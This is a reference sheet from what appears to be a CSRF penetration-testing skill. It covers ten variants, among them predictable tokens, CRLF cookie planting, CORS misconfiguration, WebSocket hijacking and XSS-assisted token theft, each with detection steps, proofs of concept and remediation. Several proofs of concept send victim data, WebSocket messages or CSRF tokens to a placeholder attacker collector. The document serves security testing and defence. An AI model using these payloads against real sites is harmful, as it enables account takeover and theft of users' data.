# CSRF Variants 9-18 — transport, header, parser and chain failures

Merged set continued: classic taxonomy folded with the v2.1 deep-mutation set; each
entry notes the alternate name it was folded from. Route from the selection table in
`SKILL.md`.

## Table of contents

- [V-09: Static or predictable CSRF tokens](#v-09-static-or-predictable-csrf-tokens)
- [V-10: Double submit cookie bypass with CRLF response splitting](#v-10-double-submit-cookie-bypass-with-crlf-response-splitting)
- [V-11: Referer and Origin validation bypass via stripping and loose regex](#v-11-referer-and-origin-validation-bypass-via-stripping-and-loose-regex)
- [V-12: Content-Type manipulation and multipart reshaping](#v-12-content-type-manipulation-and-multipart-reshaping)
- [V-13: JSON and form tunnelling with parser flexibility](#v-13-json-and-form-tunnelling-with-parser-flexibility)
- [V-14: SOP and CORS misconfiguration bypass with preflight mismatch](#v-14-sop-and-cors-misconfiguration-bypass-with-preflight-mismatch)
- [V-15: Flash based CSRF and crossdomain.xml policy hijacking](#v-15-flash-based-csrf-and-crossdomainxml-policy-hijacking)
- [V-16: Cross Site WebSocket Hijacking](#v-16-cross-site-websocket-hijacking)
- [V-17: Pre auth CSRF token injection and authentication fixation](#v-17-pre-auth-csrf-token-injection-and-authentication-fixation)
- [V-18: XSS assisted CSRF and DOM based token theft](#v-18-xss-assisted-csrf-and-dom-based-token-theft)

---

## V-09: Static or predictable CSRF tokens
**Also known as:** classic "Static or predictable tokens" / v2.1 "Cryptographic randomness deficiency via predictable and static CSRF tokens".
**Mechanism:** the token has no unguessable entropy — fixed string, sequential counter, timestamp, `md5(user_id)`, base64 of public identity, or regeneration so rare it is effectively static — so a few observed samples (your own sessions) let an attacker forge the victim's token offline. Violated assumption: "only the server could have issued this value."

**Preconditions:**
- Tokens observable across sessions (own accounts, unauthenticated token endpoints, client-side logs).
- Validation accepts the forged value server-side; weak/deterministic RNG at creation (legacy `mt_rand`, time-seeded `rand`, UUIDv1, custom hash schemes).

**Detect:**
1. Harvest 10+ tokens: two accounts × multiple sessions, plus pre-auth vs post-login; keep exact values.
2. Analyze: identical everywhere (static) · monotonically increasing (counter) · Date-like integers (timestamp) · hex-32 = MD5 of tryable input (user id, email, empty salt) · base64 decoding to structured claims containing your user id.
3. RNG angle: `mt_rand` outputs are reversible from ~2 same-seed-window outputs — if tokens are `mt_rand` concatenations, test forgeability directly instead of trusting theory.
4. Strongest probe: mint a *fresh* session, predict its token **without reading it**, submit it — acceptance is the finding.

**Proof of concept:**
```bash
curl -sS -b '<VICTIM_COOKIE>' -X POST 'https://<TARGET_HOST>/<PATH>' \
  --data 'csrf_token=<PREDICTED_TOKEN>&<BUSINESS_PARAM>=<VALUE>' \
  -H 'Origin: https://<ATTACKER_ORIGIN>'
```
Attach the 10-token sample table + observed pattern to your notes.

**Confirm:** successful *prediction* for a session you had not observed, or byte-identical tokens accepted across two different users — plus (always) the persisted state change. Retro-reading your own samples is not proof.

**False positives:** deterministic-per-session tokens (HMAC of session id) — structured but unforgeable cross-session, so cross-session forgery is the only test that matters; encrypted tokens where an HMAC breaks tampering — decode, then verify acceptance; per-user tokens repeating only within one user (V-08 territory, needs a cross-user swap); short-looking tokens compared server-side against a stored CSPRNG value (format ≠ source of truth — test what the server accepts).

**Impact:** offline forgery of the anti-CSRF secret means the attacker's page can carry a victim-valid token, defeating the primary defense on every endpoint; escalate toward account takeover if the same value doubles as a session/nonce identifier.

**Remediation:** issue ≥128-bit CSPRNG tokens (32 random bytes, base64url), store only their hash server-side bound to the session, rotate on privilege change or short TTL.

**CWE / OWASP:** CWE-330 (Insufficiently Random Values), CWE-352, CWE-798 when static; OWASP A01 (legacy A8:2017), A02 Cryptographic Failures when RNG is the root cause.

---

## V-10: Double submit cookie bypass with CRLF response splitting
**Also known as:** classic "Double submit cookie bypass" / v2.1 "State-separated double submit cookie matching bypass via CRLF injection response splitting".
**Mechanism:** double-submit treats "client sent cookie X and body value X" as proof, but both halves are attacker-controllable — cookie tossing from a sibling subdomain (`document.cookie="csrf=x; domain=.example.com"`) or CRLF/header injection planting the cookie (`%0d%0aSet-Cookie:%20csrf=x`). With both halves forged, the check proves nothing. Violated assumption: "only the server can set a cookie the request will match."

**Preconditions:**
- App relies on a mirrored cookie (`csrf`, `XSRF-TOKEN`, `csrf_token` cookie read client-side — Angular, Rails, Django REST, Laravel are the usual suspects) with no `__Host-` prefix and `Path=/`.
- A tossing point (sibling subdomain with JS write) **or** a CRLF sink: input reflected into `Location`, `Set-Cookie`, or any header without encoding (redirect targets, filenames, `X-Forwarded-Host` link building).
- Planted cookie must actually be *sent*: freshly tossed default-Lax cookies will not ride a cross-site POST — needs `SameSite=None; Secure` or a same-site vector (V-04).

**Detect:**
1. Confirm the design: body token alone → 403, but cookie + body *together* at any value → 200. That proves no server-side secret exists (isolates from V-08/V-09).
2. Hunt CRLF: `%0d%0a`, `%0d`, `\r\n` into redirect params, filenames, header echoes — look for split responses (second `Set-Cookie`, smuggled `X-` header) and attacker-controlled URLs in outgoing links.
3. Hunt tossing: subdomains with JS write capability; verify the target cookie's `Domain`/`Path` coverage.
4. Chain: plant `csrf=<ATTACKER_VALUE>`, then run the V-01 form with the same value in the body.

**Proof of concept:**
```bash
curl -sS -b 'csrf=<ATTACKER_VALUE>; session=<VICTIM_COOKIE>' -X POST \
  'https://<TARGET_HOST>/<PATH>' --data 'csrf=<ATTACKER_VALUE>&<PARAM>=<VALUE>'
curl -sS -D - 'https://<TARGET_HOST>/<REDIRECT_PARAM>=%0d%0aSet-Cookie:%20csrf=<ATTACKER_VALUE>'
```

**Confirm:** a value the server *never issued* yet accepts (split response showing your planted `Set-Cookie`, or a cookie set from the attacker subdomain) **and** the state change under that forged pair from a cross-origin page — pair both legs in one report.

**False positives:** "changed both halves and it worked" while a server-side token check you left intact still guarded it — strip every other carrier (V-06 list) first; CRLF reflecting only into the *body* (that is XSS-adjacent, not response splitting — verify with raw `-D` headers); tossed cookie that never appears in the outgoing cookie list (Lax, wrong Path, `__Host-` prefix); `XSRF-TOKEN` being only UX convenience while a real header check exists.

**Impact:** complete token bypass with zero server knowledge; the CRLF leg is usually a second, higher-severity finding (response splitting → cache poisoning, `Set-Cookie` fixation) — report both legs and how they combine.

**Remediation:** use server-side or HMAC-signed `__Host-`-prefixed tokens with constant-time comparison, and percent-encode CR/LF before any user value is written into a response header.

**CWE / OWASP:** CWE-352, CWE-113 (HTTP Response Splitting), CWE-565; OWASP A01 (legacy A8:2017).

---

## V-11: Referer and Origin validation bypass via stripping and loose regex
**Also known as:** classic "Referer/Origin header stripping" / v2.1 "Referer and Origin header validation bypass via loose and non-anchored regex evaluation".
**Mechanism:** the only defense parses `Origin`/`Referer` with a rule an attacker satisfies — accept-when-missing (strippable via `Referrer-Policy: no-referrer`, sandboxed/`data:` contexts sending `Origin: null`, HTTPS→HTTP downgrade) or an unanchored match (`re.search("target.tld")` hits `nottarget.tld`; `.*target.tld.*` hits `target.tld.evil.tld`). Violated assumption: "the header identifies the caller."

**Preconditions:**
- Origin/Referer is the *sole* control (run V-06 first — with a live token, a header bypass alone is usually not the finding).
- A strippable path (Referer-only checks are strippable; browsers send `Origin` on form POSTs and JSON, but not on navigation GETs) or an unanchored/contains/`endsWith` matcher.

**Detect:**
1. Map the rule black-box, one variable per request (status+body+side effect): `Origin` absent · `Origin: null` · `https://evil.tld` · `https://<TARGET>.evil.tld` · `https://evil.tld/?<TARGET>` · `nottarget.tld` (contains match) · `http` vs `https` · `:443` vs `:8080` · trailing slash/case.
2. Stripping vectors, verified in a browser: attacker page with `<meta name="referrer" content="no-referrer">` (kills outbound `Referer`), sandboxed iframe → `Origin: null`; capture what each browser actually sent.
3. Confirm whether the server rejects *both* headers absent at all (curl with neither — if it passes, "missing = allowed" is the whole story).
4. If the same helper gates CORS, escalate to V-14 — looseness there permits cross-origin *reads*.

**Proof of concept:**
```bash
curl -sS -b '<COOKIE>' -X POST 'https://<TARGET_HOST>/<PATH>' \
  -H 'Origin: https://<TARGET_HOST>.evil.tld' --data '<PARAM>=<VALUE>'   # regex-buster
curl -sS -b '<COOKIE>' -X POST 'https://<TARGET_HOST>/<PATH>' \
  --data '<PARAM>=<VALUE>'                                               # headers absent
# browser: <iframe sandbox="allow-forms allow-scripts" srcdoc="…auto-submit form…"> → Origin: null
```

**Confirm:** a **browser-reachable** bypass — `Origin: null` from a sandboxed iframe, a regex-satisfiable origin, or a genuinely stripped `Referer` on a navigation — **plus** the persisted state change. Curl-spoofed Origins cannot harm browser victims and are leads by themselves.

**False positives:** the classic — `curl -H 'Origin: https://target'` accepted proves nothing, because a cross-site page cannot emit an arbitrary Origin (only null/stripped/regex paths a browser can produce are findings); **"no Origin header → 200" does not mean Origin is unchecked** — Rails' `config.action_controller.forgery_protection_origin_check` (and most frameworks) evaluates Origin *only when the header is present*, so the correct control set is three-armed: (a) valid token + **wrong** Origin → must be rejected, (b) valid token + **no** Origin → often accepted by design, (c) no token → rejected. Seen 2026-10-25 on reready.co: (a)=422, (b)=200, (c)=422 — reading only (b) would have filed a nonexistent "Origin not validated" finding; the 422 body is generic, so the *status differential between (a) and (b)* is the evidence, not the body text; a check that merely *logs* bad origins while a token still validates (test each control independently); the *target's* own `Referrer-Policy` settings (your attacker page's policy is what governs its outgoing headers); a loose match on a non-security header like `X-Forwarded-Host` used only for URL building (no security decision → no finding); Safari ITP stripping `Referer` only for cross-site subresources — retest the exact vector in the claimed browser.

**Impact:** origin-restricted endpoints become CSRF-able cross-site with zero token knowledge; where the same matcher feeds CORS, severity escalates through V-14.

**Remediation:** parse both headers as URLs and compare scheme+host+port against an exact allow-list with anchored, normalized equality (no `contains`, no unanchored regex), reject absent/`null` values on state-changing requests, and validate the token too.

**CWE / OWASP:** CWE-352, CWE-183 (Permissive List of Allowed Inputs), CWE-20; OWASP A01 (legacy A8:2017).

---

## V-12: Content-Type manipulation and multipart reshaping
**Also known as:** classic "Content-Type manipulation" / v2.1 "Content-Type manipulation evasion using text/plain multipart form reshaping".
**Mechanism:** the anti-CSRF check keys on a specific `Content-Type` (skip validation for "API" types) while the parser still accepts others — or the WAF signs urlencoded bodies only. Reshaping to `text/plain` or `multipart/form-data` (both CORS **simple** types → no preflight) keeps the request cross-origin-fireable while slipping past check and filter. Violated assumption: "Content-Type identifies the request class."

**Preconditions:**
- No strict Content-Type allow-list enforced *before* parsing (Rails, PHP, wildcard Express `body-parser({type:'*/*'})` all auto-detect).
- Validation branches on Content-Type ("only urlencoded posts need tokens") or a WAF signs on one shape; victim cookie rides (V-03 posture).

**Detect:**
1. Baseline urlencoded request → replay with each CT, one variable at a time, recording **status + body + side effect**: `application/x-www-form-urlencoded; charset=utf-8`, `multipart/form-data; boundary=…`, `text/plain`, `application/json`, `text/html` (charset griefing like `charset=ibm037` only on legacy .NET/PHP stacks — note stack first).
2. For multipart preserve field names exactly (`curl -F 'param=value'`); verify the handler consumed the fields via side effect, not 200.
3. Watch the validation branch: if `text/plain` skips the token error **and** still mutates, both halves are proven.
4. Browser-side: confirm no preflight for the winning type (network shows no OPTIONS) — that is the exploitability claim (WAF-evasion encodings: `payloads.md` table).

**Proof of concept:**
```bash
curl -sS -b '<COOKIE>' -X POST 'https://<TARGET_HOST>/<PATH>' \
  -H 'Content-Type: text/plain' -H 'Origin: https://<ATTACKER_ORIGIN>' \
  --data '<BUSINESS_PARAM>=<VALUE>'
```
```js
fetch('https://<TARGET_HOST>/<PATH>', { method:'POST', mode:'no-cors', credentials:'include',
  headers:{'Content-Type':'text/plain'}, body:'<BUSINESS_PARAM>=<VALUE>' });
```

**Confirm:** the cross-origin browser request with the shaped CT mutates **without a preflight** (network evidence), the state change persists on re-fetch as victim, and the differential against the token-checked baseline CT is documented.

**False positives:** 200 whose body is `{"error":"unsupported content type"}` (status lies — read it); WAF dropping the body so origin never sees it (check origin side / repeat with evasion); "no preflight" claimed without confirming the server *parsed* the body — preflight avoidance without parse acceptance is not a finding, and juniors stop exactly there; multipart firing while a token you copied from history silently validated (strip all carriers); tooling-normalized bytes — replay raw before claiming parser griefing.

**Impact:** converts token-gated or preflight-gated endpoints into fire-and-forget cross-origin writes, and is the standard WAF-signature evasion for V-01 payloads.

**Remediation:** enforce an explicit Content-Type allow-list (415 everything else) *before* body parsing, and validate tokens independent of Content-Type.

**CWE / OWASP:** CWE-352, CWE-20, CWE-436 (Interpretation Conflict); OWASP A01 (legacy A8:2017).

---

## V-13: JSON and form tunnelling with parser flexibility
**Also known as:** classic "JSON/form tunnelling" / v2.1 "Client-side JSON-to-form tunneling parsing flexibility evasion".
**Mechanism:** the same state change is reachable through a second, less-guarded representation — JSON routes exempted from CSRF middleware on the myth that "browsers can't send JSON cross-origin" (they can: `text/plain` carrying a JSON body, a CORS simple request), or form endpoints whose framework deserializes JSON bodies (type sniffing, wildcard `type:'*/*'` parsers, Rails parameter formats). Violated assumption: "the content type the UI sends is the only one the server handles."

**Preconditions:**
- CSRF middleware exempts `application/json`, or one handler reads both representations (Express `express.json({type:'*/*'})`, Koa, Laravel `Request::json()`, Django DRF variants are the usual homes).
- Parser coerces strings to objects (or objects to fields) without re-running checks; cookie rides (V-03) and the request is simple or the preflight passes (V-14).

**Detect:**
1. Matrix on one endpoint: {urlencoded, JSON, multipart, text/plain-with-JSON, text/plain-with-urlencoded} × {token present, token absent} — the finding is a cell that mutates with the token absent under a non-UI representation.
2. Wildcard-parser probe: `Content-Type: text/plain` + raw JSON body — if fields land in the handler, sniffing is on. Reverse too: urlencoded into a JSON-only endpoint.
3. Framework specifics: Rails `_method` + `format=json`, Laravel `X-HTTP-Method-Override`, ASP.NET `[FromBody]` vs form binding; strip `X-Requested-With` — many JSON "CSRF protections" are only that header.
4. Read what actually arrived server-side (logs/body echo), not just what your tool sent.

**Proof of concept:**
```bash
curl -sS -b '<COOKIE>' -X POST 'https://<TARGET_HOST>/<API_PATH>' \
  -H 'Content-Type: text/plain' -H 'Origin: https://<ATTACKER_ORIGIN>' \
  --data '{"<BUSINESS_PARAM>":"<VALUE>"}'
curl -sS -b '<COOKIE>' -X POST 'https://<TARGET_HOST>/<FORM_PATH>' \
  -H 'Content-Type: application/json' --data '{"<BUSINESS_PARAM>":"<VALUE>"}'
```

**Confirm:** network capture showing the tunnelling request is preflight-free (or preflight passed *and* the browser read the response — different claims, prove the one you report), the persisted state change on re-fetch, and the matrix cell showing the token was not consulted.

**False positives:** the most-reported one — `application/json` *is* preflight-triggering, curl "worked" only because curl ignores CORS, and the browser blocked nothing executed (retest in-browser); JSON parsed but a token your tooling carried from history still validated (strip every carrier); body sniffed yet a downstream validator rejected unknown fields (read the side effect, not parse logs); `mode:'no-cors'` downgrading the CT to `text/plain` — confirm what the origin actually received.

**Impact:** defeats the "JSON endpoints are CSRF-immune" design assumption on SPA APIs — the most common modern surface; include the accepted-representation matrix so remediation covers every parser path.

**Remediation:** require token/Origin validation on all state-changing routes regardless of representation, parse bodies with explicit type allow-lists (never wildcard), and keep token checks independent of parser choice.

**CWE / OWASP:** CWE-352, CWE-436 (Interpretation Conflict); OWASP A01 (legacy A8:2017).

---

## V-14: SOP and CORS misconfiguration bypass with preflight mismatch
**Also known as:** classic "SOP & CORS misconfiguration bypass" / v2.1 "CORS preflight (OPTIONS) bypassing via client-side server response code mismatch".
**Mechanism:** CORS waives the SOP's read block; misconfiguring the waiver (reflected Origin + `Access-Control-Allow-Credentials: true`, `null` reflection, wildcard+credentials, subdomain over-trust, missing `Vary: Origin` letting a permissive `ACAO` be cached cross-user) upgrades CSRF into CSRF-plus-data-theft. The mismatch leg: `OPTIONS` answers 200+permissive while the actual response differs (or vice versa) — a permissive preflight with an `ACAO`-less actual response still lets the side-effecting request *execute* (write CSRF) even though the read is blocked. Violated assumption: "preflight verdict == actual verdict."

**Preconditions:**
- No token on the route (or you are exploiting the read leg on a GET API); CORS reflects/permits attacker origin with credentials, `null`, or broad wildcards — or OPTIONS/actual diverge (LB/CDN/middleware seams are where that is born).
- Credentialed reads need cookie `SameSite=None; Secure` — Lax kills the read leg (check V-03 first).

**Detect:**
1. Matrix × {origin: own, `https://<TARGET>.evil.tld`, `https://evil.tld`, `null`, `http://<TARGET>`, `https://<TARGET>:8443`} × {OPTIONS, actual GET/POST, with/without credentials} — record `ACAO`, `ACAC`, `ACAH`, `ACMA`, `Vary`, status.
2. `ACAO: *` + `ACAC: true`: browsers refuse it while curl happily prints it — note as misconfig, never claim a read.
3. `null` reflection is real only when proven from a sandboxed-iframe/`data:` document in a browser.
4. Mismatch: compare OPTIONS verdict vs actual verdict for the same origin; missing `Vary: Origin` + permissive cached `ACAO` → replay from a second client to test cross-user cache leakage.

**Proof of concept:**
```bash
curl -sS -i -X OPTIONS 'https://<TARGET_HOST>/<API_PATH>' -H 'Origin: https://<ATTACKER_ORIGIN>' \
  -H 'Access-Control-Request-Method: POST' -H 'Access-Control-Request-Headers: content-type'
```
```js
fetch('https://<TARGET_HOST>/<SENSITIVE_GET>', {credentials:'include'}).then(r=>r.json())
  .then(d=>fetch('https://<ATTACKER_COLLECTOR>',{method:'POST',mode:'no-cors',body:JSON.stringify(d)}));
```

**Confirm:** pick evidence by claim — read claim: victim-specific data (values that differ per session) actually received by the attacker page in a real browser; write claim: preflight observed passing or absent as a simple request **and** persisted state change; mismatch claim: both divergent verdicts captured for the same origin.

**False positives:** `ACAO` reflection *without* `ACAC` (no read possible — write-CSRF note only, not data theft); `ACAC` seen only in curl with wildcard (browser refuses wildcard+creds); "preflight bypassed" while the browser still refused the actual response (the console verdict is the only verdict); non-credentialed CORS on a public-data GET (no victim binding → no finding); cache claim without showing two different users' responses actually cross-contaminating (retest from a clean cache/second IP); **reflected Origin + `ACAC: true` whose response body is cookie-independent** — analytics collectors, tracking pixels and beacons routinely ship exactly this (Snowplow/Segment-style public collectors reflect any origin with credentials *by design*), and their bodies are a static 1×1 GIF or `{}`. Before filing, fetch the same URL twice with `-H 'Origin: https://evil.example'`, once bare and once with a stuffed `Cookie:`, and compare `sha256sum` of the bodies plus the `access-control-*` headers: identical bytes ⇒ nothing session-derived to steal ⇒ not a finding, log it as by-design and move on (2026-10-21, quizlet.com `jg7y` collector: reflected origin + ACAC, body SHA identical with/without cookies).

**Impact:** the severity escalator of this skill — the CORS waiver converts "forced action" into "attacker reads the response" (session-adjacent API data, PII, token endpoints); report read and write legs separately with distinct evidence.

**Remediation:** exact-origin allow-list (never blind reflection, never `null`, never wildcard+credentials), `Vary: Origin` on every dynamically CORS-answered response, and token checks on writes so CORS mistakes stay read-only.

**CWE / OWASP:** CWE-346 (Origin Validation Error), CWE-942 (Overly Permissive Cross-domain Whitelist), CWE-352; OWASP A01 (legacy A8:2017).

---

## V-15: Flash based CSRF and crossdomain.xml policy hijacking
**Also known as:** classic "Flash-based CSRF" + "crossdomain.xml exploitation" (folded) / v2.1 "Flash-based cross-domain policy specification hijacking (crossdomain.xml misconfiguration)".
**Mechanism:** legacy cross-domain *policy files* are an explicit SOP waiver — a client fetches `/crossdomain.xml` (Flash) or `/clientaccesspolicy.xml` (Silverlight) and, if the policy allows the attacker's domain or `*`, sends credentialed, custom-verb, custom-header requests and reads responses that CORS would never permit. Flash is EOL (blocked since 2021), so treat this as legacy-plus-hygiene: the file still documents cross-origin intent, policy-consuming clients (old plugins, some WebViews, embedding runtimes) still honor it, and it is hard evidence of an unmaintained posture worth attaching to an active CSRF (V-01).

**Preconditions:**
- Policy file served by the app host itself (not a CDN default) — `/crossdomain.xml`, `/clientaccesspolicy.xml`, `/crossdomain.socketpolicy`, or socket policy on TCP 843.
- Permissive content: `domain="*"`, `allow-request-headers-from … headers="*"`, `secure="false"` on an https app, or legacy wildcard/suffix-matching quirks (`*.example.com`-adjacent matchers that old players mis-suffix-match).
- A policy-consuming client exists in scope (legacy kiosk/plugin, mobile WebView, embedded player) — otherwise downgrade to informational.

**Detect:**
1. Fetch raw and save exact contents: `/crossdomain.xml`, `/clientaccesspolicy.xml`, `curl <TARGET>:843/`.
2. Parse for `domain="*"` (worst), `*.example.com` with an attacker-reachable sibling (links V-04), wildcard header grants, `allow-from` IP/userinfo tricks, `secure="false"`.
3. Identify the server: app origin vs CDN boilerplate (CDN default with no sensitive routes on that origin is context, not a finding).
4. Pair with an active leg: does the same origin expose a token-less mutator (V-01) or a readable sensitive GET (V-14)? The policy alone rarely stands as High.

**Proof of concept:**
```bash
curl -sS -D - 'https://<TARGET_HOST>/crossdomain.xml'
curl -sS -D - 'https://<TARGET_HOST>/clientaccesspolicy.xml'
# legacy client leg, only if in scope: <embed src="https://<ATTACKER_HOST>/exploit.swf">
```
Evidence = raw permissive policy with offending lines highlighted + the paired active CSRF PoC (`references/payloads.md`).

**Confirm:** the permissive policy is served *by the target origin* (no redirect/CDN mixup) **and** a demonstrable cross-origin capability tied to it — a legacy-client repro in scope, or an active CSRF/read on the same origin the policy is evidence for. Policy-file-only observations stay informational.

**False positives:** a strict policy (`domain="www.example.com"` exact) — that is correct pinning, not a finding; policy on an asset subdomain setting no cookies and hosting no auth routes (hygiene note only); claiming exploitability on a modern-only target — Flash is dead, never report "Flash CSRF" as the live mechanism there; double-counting `crossdomain.xml` and `clientaccesspolicy.xml` as two findings (fold them).

**Impact:** legacy full SOP waiver (cross-origin read + credentialed custom-verb writes, no preflight) for policy-consuming clients; on modern targets file it as informational misconfiguration that supports the severity of an adjacent active CSRF or CORS finding.

**Remediation:** delete the policy files unless a documented legacy client requires one; if required, pin exact domains, no wildcards, no wildcard header grants, never `domain="*"`.

**CWE / OWASP:** CWE-346, CWE-942, CWE-352; OWASP A01 (legacy A8:2017).

---

## V-16: Cross Site WebSocket Hijacking
**Also known as:** v2.1 "Cross-Site WebSocket Hijacking (CSWSH) via missing origin verification handshake protocols".
**Mechanism:** a WebSocket handshake is a GET `Upgrade` — no preflight, no custom-header capability, cookies attached per SameSite rules — yet many servers authenticate it purely with the session cookie and never check the `Origin` browsers reliably set. An attacker page opens `new WebSocket("wss://app/ws")`, inherits the victim's authenticated socket, and reads/writes live messages. Violated assumption: "SOP covers WebSockets" (it does not; only the server's Origin check does).

**Preconditions:**
- WS authed by cookie/session, not a one-time server-issued `?ticket=` grant (that design is CSWSH-resistant).
- No (or loose — see V-11) `Origin` validation at handshake; cookie rides the cross-site handshake: `SameSite=None; Secure`, same-site attacker (V-04), or legacy browser — a Lax/Strict cookie will not accompany a cross-site handshake in modern browsers.
- Messages authorize by connection, not per-message identity (server trusts the socket was vetted).

**Detect:**
1. Capture the legit handshake (`GET /path Upgrade: websocket`); identify what actually authenticates it — cookies? `Sec-WebSocket-Protocol` token? query ticket? (If ticket-only and unguessable, CSWSH-resistant.)
2. Replay from curl varying `Origin` (absent, `https://evil.tld`, `null`, wrong host) and cookie; 101 to *any* Origin is the core signal — but a 101 alone is a weak lead until a frame does something.
3. Browser test: `new WebSocket(url)` from an attacker page in a clean profile logged into the app; log `onopen`/`onmessage` and confirm the session cookie rode the handshake in DevTools.
4. Map the message surface: which inbound frames mutate state or return personal data (chat, notifications, order feed, admin events), and what each assumes about identity.

**Proof of concept:**
```html
<script>
  const ws = new WebSocket('wss://<TARGET_HOST>/ws');
  ws.onopen = () => ws.send('{"action":"<MUTATION_OR_QUERY>","<PARAM>":"<VALUE>"}');
  ws.onmessage = ev => fetch('https://<ATTACKER_COLLECTOR>',{method:'POST',mode:'no-cors',body:ev.data});
</script>
```

**Confirm:** victim-specific data received *from an attacker-origin page* (read leg) or a victim-visible effect from an injected frame (write leg) in a real browser, **and** the handshake capture showing no server-side Origin rejection. Both — status alone is a lead.

**False positives:** ticket/nonce auth the attacker cannot know (verify what actually authenticates before writing); `Origin` checked-but-logged (101 still appears — test with a mutating frame); `SameSite=Lax` meaning your cross-site handshake carried **no** cookie — if `onopen` never yields victim data you have nothing; message-level authz rejecting all attacker frames (then only connection-state exposure — say exactly that); `wss://` mixed-content/self-signed blocking the PoC in-browser (test artifact — retest from an https attacker page).

**Impact:** live cross-origin read/write of the victim's real-time channel — messages, notifications, account events, trading/order flow; where frames carry tokens or PII, escalate to data-exfiltration severity; write legs inherit whatever the socket can do.

**Remediation:** validate `Origin` (exact allow-list) at handshake time or authenticate the socket with a short-lived single-use ticket instead of cookies, and enforce per-message authorization tied to the socket identity.

**CWE / OWASP:** CWE-352, CWE-346, CWE-1385 (Missing Origin Checking in WebSockets); OWASP A01 (legacy A8:2017).

---

## V-17: Pre auth CSRF token injection and authentication fixation
**Also known as:** v2.1 "Decoupled authentication fixation via malicious pre-auth CSRF token injection".
**Mechanism:** the token lifecycle is decoupled from authentication — issued before login, accepted from client input pre-auth (cookie/param), or never rotated at privilege change — so an attacker who fixed a known token (or a pre-auth session holding it) keeps a *valid* CSRF secret for the victim's post-authenticated session. Login CSRF (victim placed into the attacker's session) is the usual sibling outcome. Violated assumption: "the token proven before login is meaningless after login."

**Preconditions:**
- Token/cookie generated pre-auth and reused post-login (no regeneration), **or** the app adopts client-supplied token values pre-auth (attacker-set `csrf_token` cookie — needs V-04/V-10 tossing preconditions), **or** session fixation lets the attacker pre-seed the token inside a session the victim then authenticates.
- A privilege transition observable without step-up blocking it (plain login).

**Detect:**
1. Capture cookie + token pre-login; log in on the same profile; compare both — **token unchanged *and* session id unchanged = defect** (at least no rotation).
2. Use-after-login: submit the *pre-login* token to an authenticated endpoint; accepted means it survived authentication.
3. Client-supplied value: send `Cookie: csrf=<T_FIX>` or `?csrf_token=<T_FIX>` on the landing page, log in, then forge with `<T_FIX>` — the server must never adopt your value.
4. Fixation chain: mint `SID_A` + `T_A`, plant `SID_A` on the victim (URL param / cookie over a takeover subdomain), victim logs in, attacker uses `T_A` against the now-authenticated session.
5. Repeat across logout→login and step-up transitions — non-rotation at any of them counts.

**Proof of concept:**
```bash
curl -sS -c '<ATTACKER_JAR>' 'https://<TARGET_HOST>/landing' -D -    # note SID + token <T_FIX>
# fixate <T_FIX> (+SID) onto victim, victim logs in, then:
curl -sS -b 'session=<VICTIM_SID>' -X POST 'https://<TARGET_HOST>/<PATH>' \
  --data 'csrf_token=<T_FIX>&<BUSINESS_PARAM>=<VALUE>'
```

**Confirm:** a controlled two-profile repro where the pre-auth token (or attacker-supplied value) is shown to validate **after** the victim's login — scripted end to end, not inferred from missing rotation alone — plus the persisted state change from a cross-origin page using that known token.

**False positives:** "token unchanged" while the session id rotated and the token is an HMAC of it (old token then dies — *use* it, don't compare strings); double-submit frameworks that legitimately never rotate the UX cookie while a real server-side check does (strip and retest); fixation reported when the app regenerates on login but your client pinned the SID manually (regeneration is the fix — verify the value actually changes from the victim's browser); login CSRF where anonymous sessions are intentionally allowed (prove an *authenticated* action runs under attacker-known state).

**Impact:** collapses CSRF protection for the entire authenticated session and usually opens login CSRF → chained account actions under attacker-known state (recipient changes, API keys, OAuth grants); title it "CSRF token/session not regenerated on authentication" with the two-profile chain in the repro.

**Remediation:** regenerate the session id and reissue the CSRF token on every authentication and privilege transition, and never accept client-supplied token values as authoritative — always server-generate.

**CWE / OWASP:** CWE-384 (Session Fixation), CWE-352, CWE-613 (Insufficient Session Expiration); OWASP A01 (legacy A8:2017, A2:2017 Broken Authentication).

---

## V-18: XSS assisted CSRF and DOM based token theft
**Also known as:** classic "XSS-assisted CSRF" + "DOM-based token theft" (folded).
**Mechanism:** attacker JavaScript on the app origin defeats CSRF outright — it reads the token (never `HttpOnly` by design: meta tags, inline state, cookies, `localStorage`) or skips tokens and issues credentialed requests with ambient session state. The DOM-theft leg needs weaker footing: the token merely *leaks* — reflected into `innerHTML`, served by a cross-origin-readable endpoint (JSONP `?callback=`, permissive CORS on the token route), handed out via `postMessage` without origin checks, or dropped into `Referer` when a token sits in a query string. Violated assumption: "CSRF controls survive when JS runs or reads on the origin."

**Preconditions:**
- XSS anywhere on the app origin (or same registrable zone) — finding the XSS itself routes to `xss-testing` — **or** a token-read sink: JSONP, CORS-readable token endpoint, unchecked `postMessage`, token-in-URL `Referer` leak.
- Token readable by JS (inherent to CSRF tokens); session cookie rides normally.

**Detect:**
1. Inventory token exposure: `<meta name="csrf-token">`, `window.__CSRF__`, inline `var csrf=...`, `XSRF-TOKEN` cookie, `localStorage`.
2. Hunt read primitives: JSONP-wrapped sensitive GETs (`?callback=`), token endpoint under permissive CORS (V-14), `postMessage` handlers posting tokens without `event.origin` checks, token-in-URL landing in `Referer` on outbound links (put a subresource on your attacker page and watch the header arrive), open redirects chaining fragments.
3. Chain from `xss-testing`: if an XSS exists, one probe proves both that it can read the token and execute the V-01 request.
4. DOM clobbering angle: find where the token is read via `querySelector(...)` after attacker-influenced DOM mutation — clobbering the read target is DOM-based theft *without* script execution.

**Proof of concept:**
```html
<script>const t=document.querySelector('meta[name="csrf-token"]').content;
fetch('/<PATH>',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRF-Token':t},
  body:'<BUSINESS_PARAM>=<VALUE>'});</script>
<script>function steal(d){fetch('https://<COLLECTOR>/?t='+encodeURIComponent(d.token),{mode:'no-cors'});}</script>
<script src="https://<TARGET_HOST>/api/token?callback=steal"></script>
```

**Confirm:** the token value (redacted) observed exfiltrated to your collector **or** the privileged action executed by injected JS in a real browser — **and** root-cause isolation: XSS present → report there with CSRF as impact; leak sink without script execution → report here as CSRF-enabling disclosure.

**False positives:** a token in a meta tag is the *standard pattern*, not a finding — readable-by-JS is required by design; you need a read primitive, not a location. Calling it CSRF when the real bug is XSS (severity, remediation and bounty differ); JSONP on a non-sensitive endpoint (no token, no PII → nothing); `postMessage` to a *same-origin* parent (correct usage — check `event.origin` before claiming); a hypothetical sink you never observed actually receiving the token.

**Impact:** total bypass of every CSRF control (SameSite, tokens, Origin checks) for the session lifetime — arbitrary state change, plus session theft when XSS is involved; for the standalone leak leg, demonstrate a forged request using the leaked value to prove it is enabling, not theoretical.

